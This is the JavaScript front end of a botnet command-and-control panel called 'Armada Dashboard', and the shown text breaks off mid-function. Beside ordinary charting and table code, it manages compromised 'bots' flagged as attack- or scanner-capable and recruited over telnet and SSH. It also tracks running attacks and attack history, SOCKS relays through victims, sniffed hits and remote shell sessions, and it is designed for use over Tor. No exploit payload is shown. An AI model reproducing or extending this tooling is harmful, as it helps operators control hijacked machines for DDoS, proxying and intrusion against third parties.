/* ============================================================================
   Armada Dashboard Application
   Vanilla JS — SSE with polling fallback, diff-based table updates,
   filter panel, multi-select, enhanced shell modal with file browser,
   breadcrumb nav, tab completion, split shell, bot info sidebar.
   ============================================================================ */

// ---------------------------------------------------------------------------
// Utility helpers
// ---------------------------------------------------------------------------

// Country code to flag emoji (Tor-safe, no external resources)
function countryFlag(code) {
  if (!code || code.length !== 2 || code === '??' || code === 'LO') return code || '??';
  var a = code.toUpperCase();
  return String.fromCodePoint(0x1F1E6 + a.charCodeAt(0) - 65, 0x1F1E6 + a.charCodeAt(1) - 65);
}

// Origin tag to colored badge HTML
var _originColors = {
  'direct': '#8b949e',
  'b0at.telnet': '#d29922',
  'b0at.ssh': '#58a6ff'
};
function originBadge(origin) {
  if (!origin) origin = 'direct';
  var color = _originColors[origin] || '#8b949e';
  return '<span class="origin-badge" style="background:' + color + '22;color:' + color + ';border:1px solid ' + color + '44">' + escHtml(origin) + '</span>';
}

function botCapTags(b) {
  var tags = '';
  if (b.hasAttack) tags += '<span class="cap-tag cap-atk" title="Attack capable">ATK</span>';
  if (b.hasScanner) tags += '<span class="cap-tag cap-scan" title="Scanner capable">SCAN</span>';
  return tags;
}

// ---------------------------------------------------------------------------
// localStorage persistence helpers
// ---------------------------------------------------------------------------

var LS_PREFIX = 'armada_';
function lsSet(key, val) { try { localStorage.setItem(LS_PREFIX + key, JSON.stringify(val)); } catch (e) { } }
function lsGet(key, def) { try { var v = localStorage.getItem(LS_PREFIX + key); return v !== null ? JSON.parse(v) : def; } catch (e) { return def; } }
function lsDel(key) { try { localStorage.removeItem(LS_PREFIX + key); } catch (e) { } }

function formatRAM(mb) {
  return mb >= 1024 ? (mb / 1024).toFixed(1) + 'GB' : mb + 'MB';
}

function ago(iso) {
  var d = new Date(iso), s = Math.max(0, Math.floor((Date.now() - d) / 1000));
  if (s < 5) return 'just now';
  if (s < 60) return s + 's ago';
  if (s < 3600) return Math.floor(s / 60) + 'm ago';
  if (s < 86400) return Math.floor(s / 3600) + 'h ago';
  return Math.floor(s / 86400) + 'd ago';
}

function botHealth(lastPing) {
  var s = Math.floor((Date.now() - new Date(lastPing)) / 1000);
  if (s < 30) return { cls: 'health-ok', dot: 'health-dot-ok', row: 'health-ok-row' };
  if (s < 60) return { cls: 'health-warn', dot: 'health-dot-warn', row: 'health-warn-row' };
  if (s < 120) return { cls: 'health-stale', dot: 'health-dot-stale', row: 'health-stale-row' };
  return { cls: 'health-dead', dot: 'health-dot-dead', row: 'health-dead-row' };
}

function escHtml(s) {
  var d = document.createElement('div');
  d.textContent = s;
  return d.innerHTML;
}

function showToast(msg, ok) {
  // Stack-based toasts
  var stack = document.getElementById('toast-stack');
  if (!stack) {
    stack = document.createElement('div');
    stack.id = 'toast-stack';
    stack.className = 'toast-stack';
    document.body.appendChild(stack);
  }
  var item = document.createElement('div');
  item.className = 'toast-item ' + (ok ? 'ok' : 'err');
  item.textContent = msg;
  item.onclick = function () { item.classList.add('fade-out'); setTimeout(function () { item.remove(); }, 300); };
  stack.appendChild(item);
  // Auto-dismiss after 3s
  setTimeout(function () {
    if (item.parentNode) { item.classList.add('fade-out'); setTimeout(function () { item.remove(); }, 300); }
  }, 3000);
  // Cap at 5 visible
  while (stack.children.length > 5) stack.removeChild(stack.firstChild);
  var now = new Date();
  var ts = ('0' + now.getHours()).slice(-2) + ':' + ('0' + now.getMinutes()).slice(-2) + ':' + ('0' + now.getSeconds()).slice(-2);
  addNotification(ts, (ok ? 'OK' : 'ERR') + ': ' + msg);
}

function sanitizeId(id) {
  return id.replace(/[^a-zA-Z0-9_-]/g, '_');
}

// Color-coded group tags — deterministic color from group name
var groupColors = [
  { bg: 'rgba(139, 92, 246, 0.12)', fg: '#a78bfa', border: 'rgba(139, 92, 246, 0.3)' },  // purple
  { bg: 'rgba(59, 130, 246, 0.12)', fg: '#60a5fa', border: 'rgba(59, 130, 246, 0.3)' },   // blue
  { bg: 'rgba(34, 197, 94, 0.12)', fg: '#4ade80', border: 'rgba(34, 197, 94, 0.3)' },    // green
  { bg: 'rgba(234, 179, 8, 0.12)', fg: '#facc15', border: 'rgba(234, 179, 8, 0.3)' },    // yellow
  { bg: 'rgba(6, 182, 212, 0.12)', fg: '#22d3ee', border: 'rgba(6, 182, 212, 0.3)' },    // cyan
  { bg: 'rgba(239, 68, 68, 0.12)', fg: '#f87171', border: 'rgba(239, 68, 68, 0.3)' },    // red
  { bg: 'rgba(249, 115, 22, 0.12)', fg: '#fb923c', border: 'rgba(249, 115, 22, 0.3)' },   // orange
  { bg: 'rgba(168, 85, 247, 0.12)', fg: '#c084fc', border: 'rgba(168, 85, 247, 0.3)' },   // violet
  { bg: 'rgba(236, 72, 153, 0.12)', fg: '#f472b6', border: 'rgba(236, 72, 153, 0.3)' },   // pink
  { bg: 'rgba(20, 184, 166, 0.12)', fg: '#2dd4bf', border: 'rgba(20, 184, 166, 0.3)' },   // teal
];

function groupColorIndex(name) {
  var hash = 0;
  for (var i = 0; i < name.length; i++) { hash = ((hash << 5) - hash) + name.charCodeAt(i); hash |= 0; }
  return Math.abs(hash) % groupColors.length;
}

function groupTagHtml(group) {
  if (!group) return '<span class="group-tag group-none">-</span>';
  var c = groupColors[groupColorIndex(group)];
  return '<span class="group-tag" style="background:' + c.bg + ';color:' + c.fg + ';border:1px solid ' + c.border + '">' + escHtml(group) + '</span>';
}

// ---------------------------------------------------------------------------
// SSE (Server-Sent Events)
// ---------------------------------------------------------------------------

var evtSource = null;
var sseRetryDelay = 1000;
var sseFails = 0;
var sseActive = false;
var pollingActive = false;

function connectSSE() {
  if (evtSource) evtSource.close();
  evtSource = new EventSource('/api/events');

  evtSource.onopen = function () {
    sseRetryDelay = 1000; sseFails = 0; sseActive = true;
    updateSSEIndicator(true);
  };

  evtSource.addEventListener('stats', function (e) { updateStats(JSON.parse(e.data)); });
  evtSource.addEventListener('bots', function (e) { updateBots(JSON.parse(e.data)); });
  evtSource.addEventListener('activity', function (e) { addActivityEntry(JSON.parse(e.data)); });
  evtSource.addEventListener('sniff_stats', function (e) { handleSniffStats(JSON.parse(e.data)); });
  evtSource.addEventListener('sniff_hit', function (e) { handleSniffHitSSE(JSON.parse(e.data)); });
  evtSource.addEventListener('bot_connect', function (e) {
    var bot = JSON.parse(e.data);
    addOrUpdateBot(bot);
    addNotification('connect', bot.botID + ' connected');
  });
  evtSource.addEventListener('bot_disconnect', function (e) {
    var d = JSON.parse(e.data);
    removeBot(d.botID);
    delete shellSessions[d.botID];
    // bg session WS will close on its own; the onclose handler cleans shellBgSessions
    addNotification('disconnect', d.botID + ' disconnected');
  });
  evtSource.addEventListener('socks_update', function (e) { updateBotSocks(JSON.parse(e.data)); });
  evtSource.addEventListener('attack_history', function (e) {
    var rec = JSON.parse(e.data);
    attackHistoryData.push(rec);
    if (attackHistoryData.length > 200) attackHistoryData = attackHistoryData.slice(-200);
    renderAttackHistory();
  });
  evtSource.addEventListener('ssh_hit', function () { sshRefreshHits(); sshRefreshStatus(); sshBeep(); });

  // Scan job progress (counters, status, progress bar)
  evtSource.addEventListener('scan_progress', function (e) {
    try {
      var d = JSON.parse(e.data);
      scanJobRefresh();
      // Update badge even when not on Results tab
      var countEl = document.getElementById('tab-results-count');
      if (countEl && d.hits > 0) { countEl.textContent = d.hits; countEl.style.display = ''; }
      // Live feed entry from lastHit
      if (d.lastHit) {
        scanJobAddFeedItem(d.lastHit);
      }
    } catch (ex) { }
  });

  // Scan job individual hit (live feed + beep)
  evtSource.addEventListener('scan_hit', function (e) {
    try {
      var d = JSON.parse(e.data);
      scanJobAddFeedItem(d.ip + ' — ' + (d.result || 'hit'));
      scanJobRefreshHits();
      sshBeep(); // reuse beep for scan hits
    } catch (ex) { }
  });

  evtSource.onerror = function () {
    updateSSEIndicator(false); sseActive = false; evtSource.close(); sseFails++;
    if (sseFails > 3 && !pollingActive) { startPolling(); }
    else { setTimeout(connectSSE, sseRetryDelay); sseRetryDelay = Math.min(sseRetryDelay * 2, 30000); }
  };
}

function updateSSEIndicator(connected) {
  var el = document.getElementById('sse-dot');
  if (el) { el.className = 'sse-indicator ' + (connected ? 'sse-connected' : 'sse-disconnected'); el.title = connected ? 'Live connection' : 'Reconnecting...'; }
}

function startPolling() {
  if (pollingActive) return;
  pollingActive = true;
  setInterval(function () {
    fetch('/api/stats').then(function (r) { return r.json(); }).then(updateStats).catch(function () { });
    fetch('/api/bots').then(function (r) { return r.json(); }).then(updateBots).catch(function () { });
    fetch('/api/activity').then(function (r) { return r.json(); }).then(function (entries) { renderActivityFull(entries); }).catch(function () { });
    loadRelayStats();
    scanJobRefresh(); scanJobRefreshHits();
  }, 5000);
}

// ---------------------------------------------------------------------------
// Stats
// ---------------------------------------------------------------------------

var prevBots = -1, prevRAM = -1, prevCPU = -1;

function updateStats(d) {
  document.getElementById('s-bots').textContent = d.botCount;
  document.getElementById('s-ram').textContent = formatRAM(d.totalRAM);
  document.getElementById('s-cpu').textContent = d.totalCPU + ' cores';
  document.getElementById('s-uptime').textContent = d.uptime;

  var ah = document.getElementById('s-arch');
  ah.innerHTML = '';
  if (d.archMap) {
    Object.entries(d.archMap).forEach(function (e) {
      var s = document.createElement('span'); s.className = 'arch-pill'; s.textContent = e[0] + ': ' + e[1]; ah.appendChild(s);
    });
  }

  setDelta('s-bots-delta', d.botCount, prevBots); prevBots = d.botCount;
  setDelta('s-ram-delta', d.totalRAM, prevRAM); prevRAM = d.totalRAM;
  setDelta('s-cpu-delta', d.totalCPU, prevCPU); prevCPU = d.totalCPU;

  if (d.history && d.history.length > 1) {
    drawSparkline('spark-bots', d.history.map(function (h) { return h.botCount; }));
    drawSparkline('spark-ram', d.history.map(function (h) { return h.totalRAM; }));
    drawSparkline('spark-cpu', d.history.map(function (h) { return h.totalCPU; }));
    var bots = d.history.map(function (h) { return h.botCount; });
    var mn = Math.min.apply(null, bots), mx = Math.max.apply(null, bots);
    document.getElementById('s-bots-range').textContent = 'range: ' + mn + ' \u2013 ' + mx + ' (' + d.history.length + ' samples)';
  }

  // Update analytics charts
  updateDashboardCharts(d);

  // Update running attacks from stats push
  if (d.runningAttacks !== undefined) {
    renderRunningAttacks(d.runningAttacks);
  }
}

function setDelta(id, cur, prev) {
  var el = document.getElementById(id);
  if (!el || prev < 0) return;
  var diff = cur - prev;
  if (diff > 0) { el.textContent = '+' + diff; el.className = 'stat-delta up'; }
  else if (diff < 0) { el.textContent = '' + diff; el.className = 'stat-delta down'; }
  else { el.textContent = ''; el.className = 'stat-delta flat'; }
}

function drawSparkline(id, vals) {
  var svg = document.getElementById(id);
  if (!svg || !vals.length) return;
  var mn = Math.min.apply(null, vals), mx = Math.max.apply(null, vals);
  var range = mx - mn || 1;
  var w = 120, h = 32, pad = 2;
  var pts = [];
  for (var i = 0; i < vals.length; i++) {
    var x = (i / (vals.length - 1)) * w;
    var y = pad + (h - 2 * pad) * (1 - (vals[i] - mn) / range);
    pts.push(x.toFixed(1) + ',' + y.toFixed(1));
  }
  var line = pts.join(' ');
  var fill = pts[0].split(',')[0] + ',' + h + ' ' + line + ' ' + pts[pts.length - 1].split(',')[0] + ',' + h;
  svg.innerHTML = '<polygon class="spark-fill" points="' + fill + '"/><polyline points="' + line + '"/>';
}

// ---------------------------------------------------------------------------
// Analytics Charts — pure canvas rendering (no external libs)
// ---------------------------------------------------------------------------

// Polyfill roundRect for older browsers (Tor Browser compatibility)
if (typeof CanvasRenderingContext2D !== 'undefined' && !CanvasRenderingContext2D.prototype.roundRect) {
  CanvasRenderingContext2D.prototype.roundRect = function (x, y, w, h, radii) {
    var r = typeof radii === 'number' ? [radii, radii, radii, radii] :
      Array.isArray(radii) ? radii.concat([0, 0, 0, 0]).slice(0, 4) : [0, 0, 0, 0];
    this.moveTo(x + r[0], y);
    this.lineTo(x + w - r[1], y);
    this.quadraticCurveTo(x + w, y, x + w, y + r[1]);
    this.lineTo(x + w, y + h - r[2]);
    this.quadraticCurveTo(x + w, y + h, x + w - r[2], y + h);
    this.lineTo(x + r[3], y + h);
    this.quadraticCurveTo(x, y + h, x, y + h - r[3]);
    this.lineTo(x, y + r[0]);
    this.quadraticCurveTo(x, y, x + r[0], y);
    this.closePath();
    return this;
  };
}

function getChartColors() {
  var s = getComputedStyle(document.documentElement);
  return {
    accent: s.getPropertyValue('--accent').trim() || '#8b5cf6',
    blue: s.getPropertyValue('--blue').trim() || '#3b82f6',
    green: s.getPropertyValue('--green').trim() || '#22c55e',
    red: s.getPropertyValue('--red').trim() || '#ef4444',
    yellow: s.getPropertyValue('--yellow').trim() || '#eab308',
    cyan: s.getPropertyValue('--cyan').trim() || '#06b6d4',
    text: s.getPropertyValue('--text-muted').trim() || '#64748b',
    textDim: s.getPropertyValue('--text-dim').trim() || '#475569',
    border: s.getPropertyValue('--border').trim() || '#1e2d3d',
    bg: s.getPropertyValue('--bg-card').trim() || '#111827'
  };
}

/**
 * drawLineChart — render a line chart on a canvas element
 * @param {string} canvasId - canvas element id
 * @param {Array} data - array of {x: label, y: number}
 * @param {Object} opts - optional: lineColor, fillColor, yLabel, showDots
 */
function drawLineChart(canvasId, data, opts) {
  var canvas = document.getElementById(canvasId);
  if (!canvas || !data || data.length < 2) return;
  opts = opts || {};

  var dpr = window.devicePixelRatio || 1;
  var rect = canvas.getBoundingClientRect();
  canvas.width = rect.width * dpr;
  canvas.height = rect.height * dpr;
  var ctx = canvas.getContext('2d');
  ctx.scale(dpr, dpr);
  var W = rect.width, H = rect.height;

  var c = getChartColors();
  var lineColor = opts.lineColor || c.green;
  var fillColor = opts.fillColor || (lineColor + '18');

  // Margins
  var ml = 44, mr = 12, mt = 8, mb = 28;
  var pw = W - ml - mr, ph = H - mt - mb;

  // Compute y range
  var vals = data.map(function (d) { return d.y; });
  var yMin = Math.min.apply(null, vals);
  var yMax = Math.max.apply(null, vals);
  if (yMin === yMax) { yMin = yMin > 0 ? 0 : yMin - 1; yMax = yMax + 1; }
  var yPad = (yMax - yMin) * 0.1;
  yMin = Math.max(0, yMin - yPad);
  yMax = yMax + yPad;

  function xPos(i) { return ml + (i / (data.length - 1)) * pw; }
  function yPos(v) { return mt + ph - ((v - yMin) / (yMax - yMin)) * ph; }

  // Clear
  ctx.clearRect(0, 0, W, H);

  // Gridlines
  var gridSteps = 4;
  ctx.strokeStyle = c.border;
  ctx.lineWidth = 0.5;
  ctx.setLineDash([3, 3]);
  for (var g = 0; g <= gridSteps; g++) {
    var gy = mt + (g / gridSteps) * ph;
    ctx.beginPath(); ctx.moveTo(ml, gy); ctx.lineTo(ml + pw, gy); ctx.stroke();
  }
  ctx.setLineDash([]);

  // Y-axis labels
  ctx.fillStyle = c.textDim;
  ctx.font = '10px Inter, system-ui, sans-serif';
  ctx.textAlign = 'right';
  ctx.textBaseline = 'middle';
  for (var g2 = 0; g2 <= gridSteps; g2++) {
    var yVal = yMin + ((gridSteps - g2) / gridSteps) * (yMax - yMin);
    var label = yVal >= 1000 ? (yVal / 1000).toFixed(1) + 'k' : Math.round(yVal).toString();
    ctx.fillText(label, ml - 6, mt + (g2 / gridSteps) * ph);
  }

  // X-axis labels (show ~5 evenly spaced)
  ctx.textAlign = 'center';
  ctx.textBaseline = 'top';
  var xLabelCount = Math.min(data.length, 6);
  for (var xi = 0; xi < xLabelCount; xi++) {
    var idx = Math.round(xi * (data.length - 1) / (xLabelCount - 1));
    ctx.fillText(data[idx].x, xPos(idx), mt + ph + 8);
  }

  // Fill area
  ctx.beginPath();
  ctx.moveTo(xPos(0), mt + ph);
  for (var i = 0; i < data.length; i++) {
    ctx.lineTo(xPos(i), yPos(data[i].y));
  }
  ctx.lineTo(xPos(data.length - 1), mt + ph);
  ctx.closePath();
  ctx.fillStyle = fillColor;
  ctx.fill();

  // Line
  ctx.beginPath();
  ctx.moveTo(xPos(0), yPos(data[0].y));
  for (var j = 1; j < data.length; j++) {
    ctx.lineTo(xPos(j), yPos(data[j].y));
  }
  ctx.strokeStyle = lineColor;
  ctx.lineWidth = 2;
  ctx.lineJoin = 'round';
  ctx.lineCap = 'round';
  ctx.stroke();

  // Dots (optional, default for small datasets)
  if (opts.showDots !== false && data.length <= 30) {
    for (var k = 0; k < data.length; k++) {
      ctx.beginPath();
      ctx.arc(xPos(k), yPos(data[k].y), 2.5, 0, Math.PI * 2);
      ctx.fillStyle = lineColor;
      ctx.fill();
    }
  }

  // Y-axis label text
  if (opts.yLabel) {
    ctx.save();
    ctx.fillStyle = c.textDim;
    ctx.font = '9px Inter, system-ui, sans-serif';
    ctx.textAlign = 'center';
    ctx.translate(10, mt + ph / 2);
    ctx.rotate(-Math.PI / 2);
    ctx.fillText(opts.yLabel, 0, 0);
    ctx.restore();
  }
}

/**
 * drawBarChart — render a bar chart on a canvas element
 * @param {string} canvasId - canvas element id
 * @param {Array} labels - array of string labels
 * @param {Array} values - array of numbers
 * @param {Object} opts - optional: colors (array), horizontal (bool)
 */
function drawBarChart(canvasId, labels, values, opts) {
  var canvas = document.getElementById(canvasId);
  if (!canvas || !labels || !labels.length) return;
  opts = opts || {};

  var dpr = window.devicePixelRatio || 1;
  var rect = canvas.getBoundingClientRect();
  canvas.width = rect.width * dpr;
  canvas.height = rect.height * dpr;
  var ctx = canvas.getContext('2d');
  ctx.scale(dpr, dpr);
  var W = rect.width, H = rect.height;

  var c = getChartColors();
  var palette = opts.colors || [c.green, c.blue, c.accent, c.cyan, c.yellow, c.red,
    '#f472b6', '#a78bfa', '#34d399', '#fb923c', '#38bdf8', '#facc15'];

  var vMax = Math.max.apply(null, values);
  if (vMax === 0) vMax = 1;

  if (opts.horizontal) {
    // Horizontal bar chart
    var ml = 8, mr = 12, mt = 4, mb = 4;
    // Compute label width dynamically
    ctx.font = '10px Inter, system-ui, sans-serif';
    var maxLabelW = 0;
    labels.forEach(function (l) {
      var w = ctx.measureText(l).width;
      if (w > maxLabelW) maxLabelW = w;
    });
    ml = maxLabelW + 14;

    var barAreaW = W - ml - mr;
    var barH = Math.min(22, (H - mt - mb) / labels.length - 4);
    var gap = Math.max(3, ((H - mt - mb) - barH * labels.length) / (labels.length + 1));

    ctx.clearRect(0, 0, W, H);

    for (var i = 0; i < labels.length; i++) {
      var y = mt + gap + i * (barH + gap);
      var bw = (values[i] / vMax) * barAreaW;
      if (bw < 2 && values[i] > 0) bw = 2;

      // Bar
      var color = palette[i % palette.length];
      ctx.fillStyle = color;
      ctx.beginPath();
      ctx.roundRect(ml, y, bw, barH, 3);
      ctx.fill();

      // Label
      ctx.fillStyle = c.text;
      ctx.font = '10px Inter, system-ui, sans-serif';
      ctx.textAlign = 'right';
      ctx.textBaseline = 'middle';
      ctx.fillText(labels[i], ml - 6, y + barH / 2);

      // Value
      ctx.fillStyle = c.textDim;
      ctx.textAlign = 'left';
      ctx.fillText(values[i].toString(), ml + bw + 6, y + barH / 2);
    }
  } else {
    // Vertical bar chart
    var ml2 = 36, mr2 = 12, mt2 = 8, mb2 = 32;
    var barAreaH = H - mt2 - mb2;
    var barW = Math.min(40, (W - ml2 - mr2) / labels.length - 6);
    var gap2 = ((W - ml2 - mr2) - barW * labels.length) / (labels.length + 1);

    ctx.clearRect(0, 0, W, H);

    // Gridlines
    ctx.strokeStyle = c.border;
    ctx.lineWidth = 0.5;
    ctx.setLineDash([3, 3]);
    for (var g = 0; g <= 4; g++) {
      var gy = mt2 + (g / 4) * barAreaH;
      ctx.beginPath(); ctx.moveTo(ml2, gy); ctx.lineTo(W - mr2, gy); ctx.stroke();
    }
    ctx.setLineDash([]);

    // Y-axis labels
    ctx.fillStyle = c.textDim;
    ctx.font = '10px Inter, system-ui, sans-serif';
    ctx.textAlign = 'right';
    ctx.textBaseline = 'middle';
    for (var g3 = 0; g3 <= 4; g3++) {
      var yv = vMax * (4 - g3) / 4;
      ctx.fillText(Math.round(yv).toString(), ml2 - 6, mt2 + (g3 / 4) * barAreaH);
    }

    for (var j = 0; j < labels.length; j++) {
      var x = ml2 + gap2 + j * (barW + gap2);
      var bh = (values[j] / vMax) * barAreaH;
      if (bh < 2 && values[j] > 0) bh = 2;

      // Bar
      var col = palette[j % palette.length];
      ctx.fillStyle = col;
      ctx.beginPath();
      ctx.roundRect(x, mt2 + barAreaH - bh, barW, bh, [3, 3, 0, 0]);
      ctx.fill();

      // Label
      ctx.fillStyle = c.text;
      ctx.font = '10px Inter, system-ui, sans-serif';
      ctx.textAlign = 'center';
      ctx.textBaseline = 'top';
      var lbl = labels[j].length > 8 ? labels[j].substring(0, 7) + '..' : labels[j];
      ctx.fillText(lbl, x + barW / 2, mt2 + barAreaH + 6);
    }
  }
}

/**
 * updateDashboardCharts — called from updateStats when new data arrives
 */
var _lastStatsData = null;

function updateDashboardCharts(d) {
  _lastStatsData = d;

  // 1. Bot Count line chart from history
  if (d.history && d.history.length > 1) {
    var botData = d.history.map(function (h) {
      return { x: h.time, y: h.botCount };
    });
    drawLineChart('chart-bots', botData, {
      lineColor: getChartColors().green,
      yLabel: 'Bots',
      showDots: true
    });
  }

  // 2. Scanner Recruitment bar chart from originMap
  if (d.originMap && Object.keys(d.originMap).length > 0) {
    var origins = Object.entries(d.originMap).sort(function (a, b) { return b[1] - a[1]; });
    var oLabels = origins.map(function (e) { return e[0]; });
    var oValues = origins.map(function (e) { return e[1]; });
    if (origins.length > 8) {
      drawBarChart('chart-scanners', oLabels, oValues, { horizontal: true });
    } else {
      drawBarChart('chart-scanners', oLabels, oValues, { horizontal: false });
    }
  } else {
    // Fallback: aggregate from client-side bot data
    var bots = window._botsArr || [];
    if (bots.length > 0) {
      var oMap = {};
      bots.forEach(function (b) {
        var tag = b.origin || 'unknown';
        oMap[tag] = (oMap[tag] || 0) + 1;
      });
      var entries = Object.entries(oMap).sort(function (a, b) { return b[1] - a[1]; });
      var labels = entries.map(function (e) { return e[0]; });
      var vals = entries.map(function (e) { return e[1]; });
      if (entries.length > 8) {
        drawBarChart('chart-scanners', labels, vals, { horizontal: true });
      } else {
        drawBarChart('chart-scanners', labels, vals, { horizontal: false });
      }
    }
  }

  // 3. Resource usage (RAM + CPU) dual line chart
  if (d.history && d.history.length > 1) {
    var canvas = document.getElementById('chart-resources');
    if (!canvas) return;

    var dpr = window.devicePixelRatio || 1;
    var rect = canvas.getBoundingClientRect();
    canvas.width = rect.width * dpr;
    canvas.height = rect.height * dpr;
    var ctx = canvas.getContext('2d');
    ctx.scale(dpr, dpr);
    var W = rect.width, H = rect.height;
    var c = getChartColors();

    var ml = 44, mr = 50, mt = 8, mb = 28;
    var pw = W - ml - mr, ph = H - mt - mb;

    var ramVals = d.history.map(function (h) { return h.totalRAM / (1024 * 1024); }); // MB
    var cpuVals = d.history.map(function (h) { return h.totalCPU; });

    var ramMin = Math.max(0, Math.min.apply(null, ramVals) * 0.9);
    var ramMax = Math.max.apply(null, ramVals) * 1.1 || 1;
    var cpuMin = Math.max(0, Math.min.apply(null, cpuVals) * 0.9);
    var cpuMax = Math.max.apply(null, cpuVals) * 1.1 || 1;

    function xP(i) { return ml + (i / (d.history.length - 1)) * pw; }
    function yRam(v) { return mt + ph - ((v - ramMin) / (ramMax - ramMin)) * ph; }
    function yCpu(v) { return mt + ph - ((v - cpuMin) / (cpuMax - cpuMin)) * ph; }

    ctx.clearRect(0, 0, W, H);

    // Gridlines
    ctx.strokeStyle = c.border;
    ctx.lineWidth = 0.5;
    ctx.setLineDash([3, 3]);
    for (var g = 0; g <= 4; g++) {
      var gy = mt + (g / 4) * ph;
      ctx.beginPath(); ctx.moveTo(ml, gy); ctx.lineTo(ml + pw, gy); ctx.stroke();
    }
    ctx.setLineDash([]);

    // RAM Y-axis (left)
    ctx.fillStyle = c.blue;
    ctx.font = '10px Inter, system-ui, sans-serif';
    ctx.textAlign = 'right';
    ctx.textBaseline = 'middle';
    for (var g2 = 0; g2 <= 4; g2++) {
      var rv = ramMin + ((4 - g2) / 4) * (ramMax - ramMin);
      var rlbl = rv >= 1024 ? (rv / 1024).toFixed(1) + 'G' : Math.round(rv) + 'M';
      ctx.fillText(rlbl, ml - 6, mt + (g2 / 4) * ph);
    }

    // CPU Y-axis (right)
    ctx.fillStyle = c.accent;
    ctx.textAlign = 'left';
    for (var g3 = 0; g3 <= 4; g3++) {
      var cv = cpuMin + ((4 - g3) / 4) * (cpuMax - cpuMin);
      ctx.fillText(Math.round(cv) + 'c', ml + pw + 6, mt + (g3 / 4) * ph);
    }

    // X-axis labels
    ctx.fillStyle = c.textDim;
    ctx.textAlign = 'center';
    ctx.textBaseline = 'top';
    var xCount = Math.min(d.history.length, 6);
    for (var xi = 0; xi < xCount; xi++) {
      var idx = Math.round(xi * (d.history.length - 1) / (xCount - 1));
      ctx.fillText(d.history[idx].time, xP(idx), mt + ph + 8);
    }

    // RAM fill
    ctx.beginPath();
    ctx.moveTo(xP(0), mt + ph);
    for (var i = 0; i < ramVals.length; i++) ctx.lineTo(xP(i), yRam(ramVals[i]));
    ctx.lineTo(xP(ramVals.length - 1), mt + ph);
    ctx.closePath();
    ctx.fillStyle = c.blue + '15';
    ctx.fill();

    // RAM line
    ctx.beginPath();
    ctx.moveTo(xP(0), yRam(ramVals[0]));
    for (var j = 1; j < ramVals.length; j++) ctx.lineTo(xP(j), yRam(ramVals[j]));
    ctx.strokeStyle = c.blue;
    ctx.lineWidth = 2;
    ctx.lineJoin = 'round';
    ctx.lineCap = 'round';
    ctx.stroke();

    // CPU line
    ctx.beginPath();
    ctx.moveTo(xP(0), yCpu(cpuVals[0]));
    for (var k = 1; k < cpuVals.length; k++) ctx.lineTo(xP(k), yCpu(cpuVals[k]));
    ctx.strokeStyle = c.accent;
    ctx.lineWidth = 2;
    ctx.stroke();

    // Legend
    ctx.font = '10px Inter, system-ui, sans-serif';
    var legX = ml + 4;
    ctx.fillStyle = c.blue;
    ctx.fillRect(legX, mt + 2, 12, 3);
    ctx.fillStyle = c.text;
    ctx.textAlign = 'left';
    ctx.textBaseline = 'middle';
    ctx.fillText('RAM', legX + 16, mt + 4);
    ctx.fillStyle = c.accent;
    ctx.fillRect(legX + 50, mt + 2, 12, 3);
    ctx.fillStyle = c.text;
    ctx.fillText('CPU', legX + 66, mt + 4);
  }
}

// Redraw charts on window resize
var _chartResizeTimer = null;
window.addEventListener('resize', function () {
  clearTimeout(_chartResizeTimer);
  _chartResizeTimer = setTimeout(function () {
    if (_lastStatsData) updateDashboardCharts(_lastStatsData);
  }, 250);
});

// ---------------------------------------------------------------------------
// Diff-based bot table updates
// ---------------------------------------------------------------------------

var botState = {};
var botOrder = [];
var selectedBots = {};

function updateBots(bots) {
  var newState = {};
  bots.forEach(function (b) { newState[b.botID] = b; });

  botOrder.forEach(function (id) {
    if (!newState[id]) {
      var row = document.getElementById('bot-' + sanitizeId(id));
      if (row) row.remove();
      delete selectedBots[id];
    }
  });

  var tbody = document.getElementById('bot-tbody');
  botOrder = bots.map(function (b) { return b.botID; });

  bots.forEach(function (b) {
    var existing = botState[b.botID];
    var rowId = 'bot-' + sanitizeId(b.botID);
    var row = document.getElementById(rowId);
    if (!row) { row = createBotRow(b); tbody.appendChild(row); }
    else if (botChanged(existing, b)) { updateBotRow(row, b); }
  });

  botState = newState;
  window._bots = newState;
  window._botsArr = bots;
  updateBotCount();
  if (typeof refreshAtkGroups === 'function') refreshAtkGroups();
  if (typeof refreshArchDropdowns === 'function') refreshArchDropdowns();
  renderSocksDash();
  buildFilterPanel();
  filterBotTable();
  updateGroupStats();
  updateBgIndicators();
}

function addOrUpdateBot(b) {
  botState[b.botID] = b;
  if (botOrder.indexOf(b.botID) === -1) botOrder.push(b.botID);
  var rowId = 'bot-' + sanitizeId(b.botID);
  var row = document.getElementById(rowId);
  var tbody = document.getElementById('bot-tbody');
  if (!row) { row = createBotRow(b); tbody.appendChild(row); }
  else { updateBotRow(row, b); }
  window._bots = botState;
  updateBotCount();
  buildFilterPanel();
  filterBotTable();
  updateGroupStats();
}

function removeBot(botID) {
  delete botState[botID]; delete selectedBots[botID];
  botOrder = botOrder.filter(function (id) { return id !== botID; });
  var row = document.getElementById('bot-' + sanitizeId(botID));
  if (row) row.remove();
  window._bots = botState;
  updateBotCount(); renderSocksDash(); updateMultiSelectBar(); updateGroupStats();
}

function updateBotSocks(d) {
  if (!d || !d.botID) return;
  var b = botState[d.botID]; if (!b) return;
  b.socksActive = d.socksActive; b.socksRelay = d.socksRelay || '';
  b.socksUser = d.socksUser || ''; b.socksStarted = d.socksStarted || '';
  botState[d.botID] = b; window._bots = botState;
  var row = document.getElementById('bot-' + sanitizeId(d.botID));
  if (row) updateBotRow(row, b);
  renderSocksDash();
}

function botChanged(a, b) {
  if (!a) return true;
  return a.socksActive !== b.socksActive || a.socksRelay !== b.socksRelay ||
    a.uptime !== b.uptime || a.lastPing !== b.lastPing ||
    a.ram !== b.ram || a.cpuCores !== b.cpuCores || a.group !== b.group ||
    a.scanningType !== b.scanningType || a.scanBatchRemaining !== b.scanBatchRemaining ||
    a.totalHits !== b.totalHits;
}

// Tick all "last ping" cells every second so they feel live
setInterval(function () {
  var ids = Object.keys(botState);
  for (var i = 0; i < ids.length; i++) {
    var b = botState[ids[i]];
    if (!b || !b.lastPing) continue;
    var row = document.getElementById('bot-' + sanitizeId(ids[i]));
    if (!row) continue;
    var cells = row.getElementsByTagName('td');
    if (cells.length < 14) continue;
    var h = botHealth(b.lastPing);
    cells[13].className = h.cls;
    cells[13].innerHTML = '<span class="health-dot ' + h.dot + '"></span>' + ago(b.lastPing);
    row.className = 'bot-row ' + h.row;
  }
  // Also tick the popup, drawer, and info sidebar if open
  var popPing = document.getElementById('popup-ping');
  if (popPing && popPing._lastPing) popPing.textContent = ago(popPing._lastPing);
  var drPing = document.getElementById('dr-ping');
